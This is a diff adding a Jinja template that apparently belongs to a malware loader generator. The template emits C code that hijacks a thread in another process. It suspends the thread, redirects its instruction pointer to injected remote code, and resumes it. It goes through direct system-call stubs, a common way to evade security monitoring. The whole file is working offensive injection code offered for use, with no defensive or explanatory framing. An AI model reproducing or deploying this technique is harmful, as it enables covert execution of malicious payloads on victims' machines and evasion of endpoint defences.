@@ -1,0 +1,34 @@
+{% from "macros.jinja" import syscall_call, createThreadStub with context %}
+
+{% if section == "globals" %}
+    {% include "lib/syscalls.jinja" %}
+    {% include "lib/find_thread.cpp" %}
+
+    NTSTATUS inject(HANDLE hThread, void *pRemoteCode){
+        NTSTATUS status;
+        DWORD SyscallId = 0;
+        CONTEXT ctx;
+        ctx.ContextFlags = CONTEXT_FULL;
+
+        {{ syscall_call("NtSuspendThread", "hThread, NULL") }}
+        {{ syscall_call("NtGetContextThread", "hThread, &ctx") }}
+{# TODO: handle different arch #}
+#ifdef _M_IX86
+        ctx.Eip = (DWORD_PTR) pRemoteCode;
+#else
+        ctx.Rip = (DWORD_PTR) pRemoteCode;
+#endif
+        {{ syscall_call("NtSetContextThread", "hThread, &ctx") }}
+        {{ syscall_call("NtResumeThread", "hThread, NULL") }}
+        return status;
+    }
+{% else %}
+    {# PID left from alloc_basic_remote section #}
+    HANDLE hThread = FindThread(pid);
+    if (hThread == NULL) {
+        printf("[-] Failed to aquire thread handle\n");
+        return 0;
+    }
+
+    inject(hThread, mem);
+{% endif %}
